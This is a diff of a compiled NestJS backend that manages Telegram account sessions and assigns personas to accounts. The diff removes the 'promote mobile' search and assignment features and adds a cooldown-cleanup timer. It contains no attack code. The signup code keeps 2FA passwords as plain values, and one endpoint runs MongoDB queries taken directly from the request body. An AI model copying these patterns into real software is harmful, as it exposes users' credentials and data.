@@ -13302,30 +13302,27 @@ let TgSignupService = TgSignupService_1 = class TgSignupService {
                 tgId: user.id?.toString() || '',
                 twoFA: !!password,
                 password: password || null,
-                lastActive: now.toISOString().split('T')[0],
                 expired: false,
                 channels: 0,
                 personalChats: 0,
                 totalChats: 0,
-                otherPhotoCount: 0,
+                contacts: 0,
+                msgs: 0,
+                photoCount: 0,
+                videoCount: 0,
+                movieCount: 0,
                 ownPhotoCount: 0,
+                otherPhotoCount: 0,
                 ownVideoCount: 0,
                 otherVideoCount: 0,
+                lastActive: now.toISOString().split('T')[0],
                 calls: {
                     totalCalls: 0,
                     outgoing: 0,
                     incoming: 0,
                     video: 0,
                     audio: 0,
-                    chats: [],
                 },
-                contacts: 0,
-                movieCount: 0,
-                score: 0,
-                starred: false,
-                msgs: 0,
-                photoCount: 0,
-                videoCount: 0,
                 gender: 'unknown',
             };
             if (!userData.mobile || !userData.tgId) {
@@ -19817,11 +19814,7 @@ const create_client_dto_1 = __webpack_require__(/*! ./dto/create-client.dto */ "
 const client_schema_1 = __webpack_require__(/*! ./schemas/client.schema */ "./src/components/clients/schemas/client.schema.ts");
 const search_client_dto_1 = __webpack_require__(/*! ./dto/search-client.dto */ "./src/components/clients/dto/search-client.dto.ts");
 const update_client_dto_1 = __webpack_require__(/*! ./dto/update-client.dto */ "./src/components/clients/dto/update-client.dto.ts");
-const enhanced_search_client_dto_1 = __webpack_require__(/*! ./dto/enhanced-search-client.dto */ "./src/components/clients/dto/enhanced-search-client.dto.ts");
 const execute_client_query_dto_1 = __webpack_require__(/*! ./dto/execute-client-query.dto */ "./src/components/clients/dto/execute-client-query.dto.ts");
-const promote_mobile_assignment_dto_1 = __webpack_require__(/*! ./dto/promote-mobile-assignment.dto */ "./src/components/clients/dto/promote-mobile-assignment.dto.ts");
-const promote_mobile_search_query_dto_1 = __webpack_require__(/*! ./dto/promote-mobile-search-query.dto */ "./src/components/clients/dto/promote-mobile-search-query.dto.ts");
-const client_response_dto_1 = __webpack_require__(/*! ./dto/client-response.dto */ "./src/components/clients/dto/client-response.dto.ts");
 const decorators_1 = __webpack_require__(/*! ../../decorators */ "./src/decorators/index.ts");
 const interceptors_1 = __webpack_require__(/*! ../../interceptors */ "./src/interceptors/index.ts");
 let ClientController = class ClientController {
@@ -19837,23 +19830,6 @@ let ClientController = class ClientController {
     }
     async search(query) {
         return await this.clientService.search(this.sanitizeQuery(query));
-    }
-    async searchByPromoteMobile(query) {
-        const result = await this.clientService.enhancedSearch({ promoteMobileNumber: query.mobile });
-        return {
-            clients: result.clients,
-            matches: result.promoteMobileMatches || [],
-            searchedMobile: query.mobile,
-        };
-    }
-    async enhancedSearch(query) {
-        const result = await this.clientService.enhancedSearch(this.sanitizeQuery(query));
-        return {
-            clients: result.clients,
-            searchType: result.searchType,
-            promoteMobileMatches: result.promoteMobileMatches,
-            totalResults: result.clients.length,
-        };
     }
     async updateClient(clientId) {
         const updated = await this.clientService.updateClient(clientId, '', false, true);
@@ -19887,19 +19863,13 @@ let ClientController = class ClientController {
         const { query, sort, limit, skip } = requestBody;
         return await this.clientService.executeQuery(query, sort, limit, skip);
     }
-    async addPromoteMobile(clientId, body) {
-        return this.clientService.addPromoteMobile(clientId, body.mobileNumber);
-    }
-    async removePromoteMobile(clientId, body) {
-        return await this.clientService.removePromoteMobile(clientId, body.mobileNumber);
-    }
 };
 exports.ClientController = ClientController;
 __decorate([
     (0, common_1.Post)(),
-    (0, swagger_1.ApiOperation)({ summary: 'Create user data' }),
+    (0, swagger_1.ApiOperation)({ summary: 'Create a client' }),
     (0, swagger_1.ApiBody)({ type: create_client_dto_1.CreateClientDto }),
-    (0, swagger_1.ApiResponse)({ description: 'The user data has been successfully created.', type: client_schema_1.Client }),
+    (0, swagger_1.ApiResponse)({ type: client_schema_1.Client }),
     __param(0, (0, common_1.Body)()),
     __metadata("design:type", Function),
     __metadata("design:paramtypes", [create_client_dto_1.CreateClientDto]),
@@ -19907,49 +19877,17 @@ __decorate([
 ], ClientController.prototype, "create", null);
 __decorate([
     (0, common_1.Get)('search'),
-    (0, swagger_1.ApiOperation)({ summary: 'Search user data' }),
-    (0, swagger_1.ApiQuery)({ name: 'clientId', required: false, description: 'Client ID' }),
-    (0, swagger_1.ApiQuery)({ name: 'dbcoll', required: false, description: 'Database collection name' }),
-    (0, swagger_1.ApiQuery)({ name: 'channelLink', required: false, description: 'Channel link' }),
-    (0, swagger_1.ApiQuery)({ name: 'link', required: false, description: 'Client link' }),
-    (0, swagger_1.ApiResponse)({ description: 'Matching user data returned successfully.', type: [client_schema_1.Client] }),
+    (0, swagger_1.ApiOperation)({ summary: 'Search clients' }),
+    (0, swagger_1.ApiResponse)({ type: [client_schema_1.Client] }),
     __param(0, (0, common_1.Query)()),
     __metadata("design:type", Function),
     __metadata("design:paramtypes", [search_client_dto_1.SearchClientDto]),
     __metadata("design:returntype", Promise)
 ], ClientController.prototype, "search", null);
 __decorate([
-    (0, common_1.Get)('search/promote-mobile'),
-    (0, swagger_1.ApiOperation)({ summary: 'Search clients by promote mobile numbers' }),
-    (0, swagger_1.ApiQuery)({ name: 'mobile', required: true, description: 'Promote mobile number to search for' }),
-    (0, swagger_1.ApiResponse)({
-        description: 'Clients with matching promote mobiles returned successfully.',
-        type: client_response_dto_1.PromoteMobileSearchResponseDto,
-    }),
-    __param(0, (0, common_1.Query)()),
-    __metadata("design:type", Function),
-    __metadata("design:paramtypes", [promote_mobile_search_query_dto_1.PromoteMobileSearchQueryDto]),
-    __metadata("design:returntype", Promise)
-], ClientController.prototype, "searchByPromoteMobile", null);
-__decorate([
-    (0, common_1.Get)('search/enhanced'),
-    (0, swagger_1.ApiOperation)({ summary: 'Enhanced search with promote mobile support' }),
-    (0, swagger_1.ApiQuery)({ name: 'promoteMobileNumber', required: false, description: 'Promote mobile number to search for' }),
-    (0, swagger_1.ApiQuery)({ name: 'hasPromoteMobiles', required: false, description: 'Filter by clients that have promote mobiles (true/false)' }),
-    (0, swagger_1.ApiResponse)({
-        description: 'Enhanced search results with promote mobile context.',
-        type: client_response_dto_1.EnhancedClientSearchResponseDto,
-    }),
-    __param(0, (0, common_1.Query)()),
-    __metadata("design:type", Function),
-    __metadata("design:paramtypes", [enhanced_search_client_dto_1.EnhancedSearchClientDto]),
-    __metadata("design:returntype", Promise)
-], ClientController.prototype, "enhancedSearch", null);
-__decorate([
     (0, common_1.Get)('updateClient/:clientId'),
-    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
-    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID' }),
-    (0, swagger_1.ApiResponse)({ description: 'Return the user data.', type: String }),
+    (0, swagger_1.ApiOperation)({ summary: 'Refresh client profile on Telegram' }),
+    (0, swagger_1.ApiParam)({ name: 'clientId' }),
     __param(0, (0, common_1.Param)('clientId')),
     __metadata("design:type", Function),
     __metadata("design:paramtypes", [String]),
@@ -19959,8 +19897,8 @@ __decorate([
     (0, common_1.Get)('maskedCls'),
     (0, common_1.UseInterceptors)(interceptors_1.CloudflareCacheInterceptor),
     (0, decorators_1.CloudflareCache)(3600, 60),
-    (0, swagger_1.ApiOperation)({ summary: 'Get all user data with masked fields' }),
-    (0, swagger_1.ApiResponse)({ description: 'All user data returned successfully.', type: [client_schema_1.Client] }),
+    (0, swagger_1.ApiOperation)({ summary: 'Get all clients (sensitive fields masked)' }),
+    (0, swagger_1.ApiResponse)({ type: [client_schema_1.Client] }),
     __metadata("design:type", Function),
     __metadata("design:paramtypes", []),
     __metadata("design:returntype", Promise)
@@ -19969,9 +19907,9 @@ __decorate([
     (0, common_1.Get)('maskedCls/:clientId'),
     (0, common_1.UseInterceptors)(interceptors_1.CloudflareCacheInterceptor),
     (0, decorators_1.CloudflareCache)(3600, 60),
-    (0, swagger_1.ApiOperation)({ summary: 'Get user data with masked fields by ID' }),
-    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID' }),
-    (0, swagger_1.ApiResponse)({ description: 'User data returned successfully.', type: client_schema_1.Client }),
+    (0, swagger_1.ApiOperation)({ summary: 'Get client by ID (sensitive fields masked)' }),
+    (0, swagger_1.ApiParam)({ name: 'clientId' }),
+    (0, swagger_1.ApiResponse)({ type: client_schema_1.Client }),
     __param(0, (0, common_1.Param)('clientId')),
     __metadata("design:type", Function),
     __metadata("design:paramtypes", [String]),
@@ -19981,8 +19919,8 @@ __decorate([
     (0, common_1.Get)(),
     (0, common_1.UseInterceptors)(interceptors_1.CloudflareCacheInterceptor),
     (0, decorators_1.CloudflareCache)(3600, 60),
-    (0, swagger_1.ApiOperation)({ summary: 'Get all user data' }),
-    (0, swagger_1.ApiResponse)({ description: 'All user data returned successfully.', type: [client_schema_1.Client] }),
+    (0, swagger_1.ApiOperation)({ summary: 'Get all clients' }),
+    (0, swagger_1.ApiResponse)({ type: [client_schema_1.Client] }),
     __metadata("design:type", Function),
     __metadata("design:paramtypes", []),
     __metadata("design:returntype", Promise)
@@ -19990,7 +19928,7 @@ __decorate([
 __decorate([
     (0, common_1.Get)(':clientId/persona-pool'),
     (0, swagger_1.ApiOperation)({ summary: 'Get persona pool for a client' }),
-    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID' }),
+    (0, swagger_1.ApiParam)({ name: 'clientId' }),
     __param(0, (0, common_1.Param)('clientId')),
     __metadata("design:type", Function),
     __metadata("design:paramtypes", [String]),
@@ -19998,9 +19936,9 @@ __decorate([
 ], ClientController.prototype, "getPersonaPool", null);
 __decorate([
     (0, common_1.Get)(':clientId/existing-assignments'),
-    (0, swagger_1.ApiOperation)({ summary: 'Get existing persona assignments for a client' }),
-    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID' }),
-    (0, swagger_1.ApiQuery)({ name: 'scope', required: false, enum: ['all', 'buffer', 'promote', 'activeClient'] }),
+    (0, swagger_1.ApiOperation)({ summary: 'Get existing persona assignments' }),
+    (0, swagger_1.ApiParam)({ name: 'clientId' }),
+    (0, swagger_1.ApiQuery)({ name: 'scope', required: false, enum: ['all', 'buffer', 'activeClient'] }),
     __param(0, (0, common_1.Param)('clientId')),
     __param(1, (0, common_1.Query)('scope')),
     __metadata("design:type", Function),
@@ -20009,9 +19947,9 @@ __decorate([
 ], ClientController.prototype, "getExistingAssignments", null);
 __decorate([
     (0, common_1.Get)(':clientId'),
-    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
-    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID' }),
-    (0, swagger_1.ApiResponse)({ description: 'User data returned successfully.', type: client_schema_1.Client }),
+    (0, swagger_1.ApiOperation)({ summary: 'Get client by ID' }),
+    (0, swagger_1.ApiParam)({ name: 'clientId' }),
+    (0, swagger_1.ApiResponse)({ type: client_schema_1.Client }),
     __param(0, (0, common_1.Param)('clientId')),
     __metadata("design:type", Function),
     __metadata("design:paramtypes", [String]),
@@ -20019,10 +19957,10 @@ __decorate([
 ], ClientController.prototype, "findOne", null);
 __decorate([
     (0, common_1.Patch)(':clientId'),
-    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
-    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID' }),
+    (0, swagger_1.ApiOperation)({ summary: 'Update client' }),
+    (0, swagger_1.ApiParam)({ name: 'clientId' }),
     (0, swagger_1.ApiBody)({ type: update_client_dto_1.UpdateClientDto }),
-    (0, swagger_1.ApiResponse)({ description: 'The user data has been successfully updated.', type: client_schema_1.Client }),
+    (0, swagger_1.ApiResponse)({ type: client_schema_1.Client }),
     __param(0, (0, common_1.Param)('clientId')),
     __param(1, (0, common_1.Body)()),
     __metadata("design:type", Function),
@@ -20031,9 +19969,9 @@ __decorate([
 ], ClientController.prototype, "update", null);
 __decorate([
     (0, common_1.Delete)(':clientId'),
-    (0, swagger_1.ApiOperation)({ summary: 'Delete user data by ID' }),
-    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'Client ID' }),
-    (0, swagger_1.ApiResponse)({ description: 'The user data has been successfully deleted.', type: client_schema_1.Client }),
+    (0, swagger_1.ApiOperation)({ summary: 'Delete client' }),
+    (0, swagger_1.ApiParam)({ name: 'clientId' }),
+    (0, swagger_1.ApiResponse)({ type: client_schema_1.Client }),
     __param(0, (0, common_1.Param)('clientId')),
     __metadata("design:type", Function),
     __metadata("design:paramtypes", [String]),
@@ -20041,38 +19979,14 @@ __decorate([
 ], ClientController.prototype, "remove", null);
 __decorate([
     (0, common_1.Post)('query'),
-    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' }),
+    (0, swagger_1.ApiOperation)({ summary: 'Execute custom MongoDB query' }),
     (0, swagger_1.ApiBody)({ type: execute_client_query_dto_1.ExecuteClientQueryDto }),
-    (0, swagger_1.ApiResponse)({ description: 'Query executed successfully.', type: [client_schema_1.Client] }),
+    (0, swagger_1.ApiResponse)({ type: [client_schema_1.Client] }),
     __param(0, (0, common_1.Body)()),
     __metadata("design:type", Function),
     __metadata("design:paramtypes", [execute_client_query_dto_1.ExecuteClientQueryDto]),
     __metadata("design:returntype", Promise)
 ], ClientController.prototype, "executeQuery", null);
-__decorate([
-    (0, common_1.Patch)(':clientId/promoteMobile/add'),
-    (0, swagger_1.ApiOperation)({ summary: 'Add a mobile number as a promote mobile for a specific client' }),
-    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'The unique identifier of the client' }),
-    (0, swagger_1.ApiBody)({ type: promote_mobile_assignment_dto_1.PromoteMobileAssignmentDto }),
-    (0, swagger_1.ApiResponse)({ description: 'Mobile number assigned as promote mobile successfully.', type: client_schema_1.Client }),
-    __param(0, (0, common_1.Param)('clientId')),
-    __param(1, (0, common_1.Body)()),
-    __metadata("design:type", Function),
-    __metadata("design:paramtypes", [String, promote_mobile_assignment_dto_1.PromoteMobileAssignmentDto]),
-    __metadata("design:returntype", Promise)
-], ClientController.prototype, "addPromoteMobile", null);
-__decorate([
-    (0, common_1.Patch)(':clientId/promoteMobile/remove'),
-    (0, swagger_1.ApiOperation)({ summary: 'Remove a promote mobile assignment from a specific client' }),
-    (0, swagger_1.ApiParam)({ name: 'clientId', description: 'The unique identifier of the client' }),
-    (0, swagger_1.ApiBody)({ type: promote_mobile_assignment_dto_1.PromoteMobileAssignmentDto }),
-    (0, swagger_1.ApiResponse)({ description: 'Promote mobile assignment removed successfully.', type: client_schema_1.Client }),
-    __param(0, (0, common_1.Param)('clientId')),
-    __param(1, (0, common_1.Body)()),
-    __metadata("design:type", Function),
-    __metadata("design:paramtypes", [String, promote_mobile_assignment_dto_1.PromoteMobileAssignmentDto]),
-    __metadata("design:returntype", Promise)
-], ClientController.prototype, "removePromoteMobile", null);
 exports.ClientController = ClientController = __decorate([
     (0, swagger_1.ApiTags)('Clients'),
     (0, common_1.Controller)('clients'),
@@ -20108,8 +20022,6 @@ const users_module_1 = __webpack_require__(/*! ../users/users.module */ "./src/c
 const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
 const timestamp_module_1 = __webpack_require__(/*! ../timestamps/timestamp.module */ "./src/components/timestamps/timestamp.module.ts");
 const session_manager_1 = __webpack_require__(/*! ../session-manager */ "./src/components/session-manager/index.ts");
-const promote_client_module_1 = __webpack_require__(/*! ../promote-clients/promote-client.module */ "./src/components/promote-clients/promote-client.module.ts");
-const promote_clients_1 = __webpack_require__(/*! ../promote-clients */ "./src/components/promote-clients/index.ts");
 let ClientModule = class ClientModule {
 };
 exports.ClientModule = ClientModule;
@@ -20118,13 +20030,11 @@ exports.ClientModule = ClientModule = __decorate([
         imports: [
             init_module_1.InitModule,
             mongoose_1.MongooseModule.forFeature([{ name: client_schema_1.Client.name, schema: client_schema_1.ClientSchema }]),
-            mongoose_1.MongooseModule.forFeature([{ name: promote_clients_1.PromoteClient.name, schema: promote_clients_1.PromoteClientSchema, collection: 'promoteClients' }]),
             (0, common_1.forwardRef)(() => Telegram_module_1.TelegramModule),
             (0, common_1.forwardRef)(() => buffer_client_module_1.BufferClientModule),
             (0, common_1.forwardRef)(() => users_module_1.UsersModule),
             (0, common_1.forwardRef)(() => session_manager_1.SessionModule),
             (0, common_1.forwardRef)(() => timestamp_module_1.TimestampModule),
-            (0, common_1.forwardRef)(() => promote_client_module_1.PromoteClientModule),
         ],
         controllers: [client_controller_1.ClientController],
         providers: [client_service_1.ClientService],
@@ -20205,7 +20115,6 @@ const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/ut
 const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
 const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
 const connection_manager_1 = __webpack_require__(/*! ../Telegram/utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
-const promote_client_schema_1 = __webpack_require__(/*! ../promote-clients/schemas/promote-client.schema */ "./src/components/promote-clients/schemas/promote-client.schema.ts");
 const path_1 = __importDefault(__webpack_require__(/*! path */ "path"));
 const fs = __importStar(__webpack_require__(/*! fs */ "fs"));
 const tl_1 = __webpack_require__(/*! telegram/tl */ "telegram/tl");
@@ -20223,11 +20132,11 @@ const CONFIG = {
     CACHE_WARMUP_THRESHOLD: 20,
     COOLDOWN_PERIOD: 240000,
     UPDATE_CLIENT_COOLDOWN: 30000,
+    MAP_CLEANUP_INTERVAL: 10 * 60 * 1000,
 };
 let ClientService = ClientService_1 = class ClientService {
-    constructor(clientModel, promoteClientModel, telegramService, bufferClientService, usersService) {
+    constructor(clientModel, telegramService, bufferClientService, usersService) {
         this.clientModel = clientModel;
-        this.promoteClientModel = promoteClientModel;
         this.telegramService = telegramService;
         this.bufferClientService = bufferClientService;
         this.usersService = usersService;
@@ -20238,6 +20147,7 @@ let ClientService = ClientService_1 = class ClientService {
         this.cacheMetadata = { lastUpdated: 0, isStale: true };
         this.checkInterval = null;
         this.refreshInterval = null;
+        this.cleanupInterval = null;
         this.isInitialized = false;
         this.isShuttingDown = false;
         this.refreshPromise = null;
@@ -20259,10 +20169,14 @@ let ClientService = ClientService_1 = class ClientService {
                 clearInterval(this.checkInterval);
             if (this.refreshInterval)
                 clearInterval(this.refreshInterval);
+            if (this.cleanupInterval)
+                clearInterval(this.cleanupInterval);
             if (this.refreshPromise)
                 await this.refreshPromise;
             await connection_manager_1.connectionManager.shutdown();
             this.clientsMap.clear();
+            this.lastUpdateMap.clear();
+            this.setupCooldownMap.clear();
         }
         catch (e) {
             (0, parseError_1.parseError)(e, 'Error during Client Service shutdown');
@@ -20281,6 +20195,25 @@ let ClientService = ClientService_1 = class ClientService {
             this.updateCacheMetadata();
         }, 60000);
         this.refreshInterval.unref();
+        this.cleanupInterval = setInterval(() => {
+            if (this.isShuttingDown)
+                return;
+            this.purgeExpiredCooldowns();
+        }, CONFIG.MAP_CLEANUP_INTERVAL);
+        this.cleanupInterval.unref();
+    }
+    purgeExpiredCooldowns() {
+        const now = Date.now();
+        for (const [clientId, timestamp] of this.setupCooldownMap) {
+            if (now > timestamp + CONFIG.COOLDOWN_PERIOD) {
+                this.setupCooldownMap.delete(clientId);
+            }
+        }
+        for (const [clientId, timestamp] of this.lastUpdateMap) {
+            if (now - timestamp > CONFIG.UPDATE_CLIENT_COOLDOWN) {
+                this.lastUpdateMap.delete(clientId);
+            }
+        }
     }
     async performPeriodicRefresh() {
         if (this.refreshPromise) {
@@ -20352,7 +20285,7 @@ let ClientService = ClientService_1 = class ClientService {
         }, {});
     }
     async findAllMaskedObject(query) {
-        const filteredClients = query ? (await this.enhancedSearch(query)).clients : await this.findAll();
+        const filteredClients = query ? await this.search(query) : await this.findAll();
         return filteredClients.reduce((acc, client) => {
             const { session, mobile, password, ...maskedClient } = client;
             acc[client.clientId] = { clientId: client.clientId, ...maskedClient };
@@ -20418,59 +20351,11 @@ let ClientService = ClientService_1 = class ClientService {
     }
     async search(filter) {
         try {
-            let workingFilter = { ...filter };
-            if (workingFilter.hasPromoteMobiles !== undefined) {
-                workingFilter = await this.processPromoteMobileFilter(workingFilter);
-            }
-            workingFilter = this.processTextSearchFields(workingFilter);
+            const workingFilter = this.processTextSearchFields({ ...filter });
             return this.executeWithRetry(() => this.clientModel.find(workingFilter).lean().exec());
         }
         catch (error) {
             const errorDetails = (0, parseError_1.parseError)(error, `Failed to search clients with filter ${JSON.stringify(filter)}`);
-            throw new common_1.InternalServerErrorException(errorDetails.message);
-        }
-    }
-    async searchClientsByPromoteMobile(mobileNumbers) {
-        if (!Array.isArray(mobileNumbers) || mobileNumbers.length === 0)
-            return [];
-        const promoteClients = await this.executeWithRetry(() => this.promoteClientModel
-            .find({ mobile: { $in: mobileNumbers }, clientId: { $exists: true } })
-            .lean()
-            .exec());
-        const clientIds = [...new Set(promoteClients.map((pc) => pc.clientId))];
-        return this.executeWithRetry(() => this.clientModel.find({ clientId: { $in: clientIds } }).lean().exec());
-    }
-    async enhancedSearch(filter) {
-        try {
-            const workingFilter = { ...filter };
-            let searchType = 'direct';
-            let promoteMobileMatches = [];
-            if (workingFilter.promoteMobileNumber) {
-                searchType = 'promoteMobile';
-                const mobileNumber = workingFilter.promoteMobileNumber;
-                delete workingFilter.promoteMobileNumber;
-                const promoteClients = await this.executeWithRetry(() => this.promoteClientModel
-                    .find({
-                    mobile: { $regex: new RegExp(this.escapeRegex(mobileNumber), 'i') },
-                    clientId: { $exists: true },
-                })
-                    .lean()
-                    .exec());
-                promoteMobileMatches = promoteClients.map((pc) => ({
-                    clientId: pc.clientId,
-                    mobile: pc.mobile,
-                }));
-                workingFilter.clientId = { $in: promoteClients.map((pc) => pc.clientId) };
-            }
-            const clients = await this.search(workingFilter);
-            return {
-                clients,
-                searchType,
-                promoteMobileMatches: promoteMobileMatches.length > 0 ? promoteMobileMatches : undefined,
-            };
-        }
-        catch (error) {
-            const errorDetails = (0, parseError_1.parseError)(error, `Failed to perform enhanced search with filter ${JSON.stringify(filter)}`);
             throw new common_1.InternalServerErrorException(errorDetails.message);
         }
     }
@@ -20513,19 +20398,6 @@ let ClientService = ClientService_1 = class ClientService {
             (0, fetchWithTimeout_1.fetchWithTimeout)(`${process.env.uptimebot}/refreshmap`, { timeout: 5000 }),
         ]);
         this.logger.debug('External maps refreshed');
-    }
-    async processPromoteMobileFilter(filter) {
-        const nextFilter = { ...filter };
-        const hasPromoteMobilesValue = typeof filter.hasPromoteMobiles === 'string'
-            ? filter.hasPromoteMobiles
-            : String(filter.hasPromoteMobiles);
-        const hasPromoteMobiles = hasPromoteMobilesValue.toLowerCase() === 'true';
-        delete nextFilter.hasPromoteMobiles;
-        const clientsWithPromoteMobiles = await this.executeWithRetry(() => this.promoteClientModel.find({ clientId: { $exists: true } }).distinct('clientId').lean());
-        nextFilter.clientId = hasPromoteMobiles
-            ? { $in: clientsWithPromoteMobiles }
-            : { $nin: clientsWithPromoteMobiles };
-        return nextFilter;
     }
     processTextSearchFields(filter) {
         const nextFilter = { ...filter };
@@ -21099,56 +20971,6 @@ let ClientService = ClientService_1 = class ClientService {
             queryExec.skip(skip);
         return queryExec.exec();
     }
-    async getPromoteMobiles(clientId) {
-        if (!clientId)
-            throw new common_1.BadRequestException('ClientId is required');
-        const promoteClients = await this.promoteClientModel.find({ clientId }).lean();
-        return promoteClients.map((pc) => pc.mobile).filter((mobile) => mobile);
-    }
-    async getAllPromoteMobiles() {
-        const allPromoteClients = await this.promoteClientModel
-            .find({ clientId: { $exists: true } })
-            .lean();
-        return allPromoteClients.map((pc) => pc.mobile);
-    }
-    async isPromoteMobile(mobile) {
-        const promoteClient = await this.promoteClientModel.findOne({ mobile }).lean();
-        return {
-            isPromote: !!promoteClient && !!promoteClient.clientId,
-            clientId: promoteClient?.clientId,
-        };
-    }
-    async addPromoteMobile(clientId, mobileNumber) {
-        const client = await this.clientModel.findOne({ clientId }).lean();
-        if (!client)
-            throw new common_1.NotFoundException(`Client ${clientId} not found`);
-        const existingPromoteClient = await this.promoteClientModel.findOne({ mobile: mobileNumber }).lean();
-        if (existingPromoteClient) {
-            if (existingPromoteClient.clientId === clientId) {
-                throw new common_1.BadRequestException(`Mobile ${mobileNumber} is already a promote mobile for client ${clientId}`);
-            }
-            else if (existingPromoteClient.clientId) {
-                throw new common_1.BadRequestException(`Mobile ${mobileNumber} is already assigned to client ${existingPromoteClient.clientId}`);
-            }
-            else {
-                await this.promoteClientModel.updateOne({ mobile: mobileNumber }, { $set: { clientId } });
-            }
-        }
-        else {
-            throw new common_1.NotFoundException(`Mobile ${mobileNumber} not found in PromoteClient collection. Please add it first.`);
-        }
-        return client;
-    }
-    async removePromoteMobile(clientId, mobileNumber) {
-        const client = await this.clientModel.findOne({ clientId }).lean();
-        if (!client)
-            throw new common_1.NotFoundException(`Client ${clientId} not found`);
-        const result = await this.promoteClientModel.updateOne({ mobile: mobileNumber, clientId }, { $unset: { clientId: 1 } });
-        if (result.matchedCount === 0) {
-            throw new common_1.NotFoundException(`Mobile ${mobileNumber} is not a promote mobile for client ${clientId}`);
-        }
-        return client;
-    }
     async getPersonaPool(clientId) {
         const client = await this.findOne(clientId, false);
         if (!client)
@@ -21231,18 +21053,6 @@ let ClientService = ClientService_1 = class ClientService {
                 source: 'buffer',
             })));
         }
-        if (scope === 'all' || scope === 'promote') {
-            const promotes = await this.promoteClientModel
-                .find(filter, projection).lean();
-            assignments.push(...promotes.map(p => ({
-                mobile: p.mobile,
-                assignedFirstName: p.assignedFirstName,
-                assignedLastName: p.assignedLastName || null,
-                assignedBio: p.assignedBio || null,
-                assignedProfilePics: p.assignedProfilePics || [],
-                source: 'promote',
-            })));
-        }
         if (scope === 'all' || scope === 'activeClient') {
             const client = await this.findOne(clientId, false);
             const activeClientAssignment = await this.getActiveClientAssignment(client);
@@ -21265,85 +21075,14 @@ exports.ClientService = ClientService;
 exports.ClientService = ClientService = ClientService_1 = __decorate([
     (0, common_1.Injectable)(),
     __param(0, (0, mongoose_1.InjectModel)(client_schema_1.Client.name)),
-    __param(1, (0, mongoose_1.InjectModel)(promote_client_schema_1.PromoteClient.name)),
-    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
-    __param(3, (0, common_1.Inject)((0, common_1.forwardRef)(() => buffer_client_service_1.BufferClientService))),
-    __param(4, (0, common_1.Inject)((0, common_1.forwardRef)(() => users_service_1.UsersService))),
+    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
+    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => buffer_client_service_1.BufferClientService))),
+    __param(3, (0, common_1.Inject)((0, common_1.forwardRef)(() => users_service_1.UsersService))),
     __metadata("design:paramtypes", [mongoose_2.Model,
-        mongoose_2.Model,
         Telegram_service_1.TelegramService,
         buffer_client_service_1.BufferClientService,
         users_service_1.UsersService])
 ], ClientService);
-
-
-/***/ },
-
-/***/ "./src/components/clients/dto/client-response.dto.ts"
-/*!***********************************************************!*\
-  !*** ./src/components/clients/dto/client-response.dto.ts ***!
-  \***********************************************************/
-(__unused_webpack_module, exports, __webpack_require__) {
-
-
-var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
-    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
-    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
-    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
-    return c > 3 && r && Object.defineProperty(target, key, r), r;
-};
-var __metadata = (this && this.__metadata) || function (k, v) {
-    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
-};
-Object.defineProperty(exports, "__esModule", ({ value: true }));
-exports.EnhancedClientSearchResponseDto = exports.PromoteMobileSearchResponseDto = exports.PromoteMobileMatchDto = void 0;
-const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
-const client_schema_1 = __webpack_require__(/*! ../schemas/client.schema */ "./src/components/clients/schemas/client.schema.ts");
-class PromoteMobileMatchDto {
-}
-exports.PromoteMobileMatchDto = PromoteMobileMatchDto;
-__decorate([
-    (0, swagger_1.ApiProperty)({ example: 'client-a' }),
-    __metadata("design:type", String)
-], PromoteMobileMatchDto.prototype, "clientId", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)({ example: '916265240911' }),
-    __metadata("design:type", String)
-], PromoteMobileMatchDto.prototype, "mobile", void 0);
-class PromoteMobileSearchResponseDto {
-}
-exports.PromoteMobileSearchResponseDto = PromoteMobileSearchResponseDto;
-__decorate([
-    (0, swagger_1.ApiProperty)({ type: [client_schema_1.Client] }),
-    __metadata("design:type", Array)
-], PromoteMobileSearchResponseDto.prototype, "clients", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)({ type: [PromoteMobileMatchDto] }),
-    __metadata("design:type", Array)
-], PromoteMobileSearchResponseDto.prototype, "matches", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)({ example: '916265240911' }),
-    __metadata("design:type", String)
-], PromoteMobileSearchResponseDto.prototype, "searchedMobile", void 0);
-class EnhancedClientSearchResponseDto {
-}
-exports.EnhancedClientSearchResponseDto = EnhancedClientSearchResponseDto;
-__decorate([
-    (0, swagger_1.ApiProperty)({ type: [client_schema_1.Client] }),
-    __metadata("design:type", Array)
-], EnhancedClientSearchResponseDto.prototype, "clients", void 0);
-__decorate([
-    (0, swagger_1.ApiProperty)({ enum: ['direct', 'promoteMobile', 'mixed'], example: 'promoteMobile' }),
-    __metadata("design:type", String)
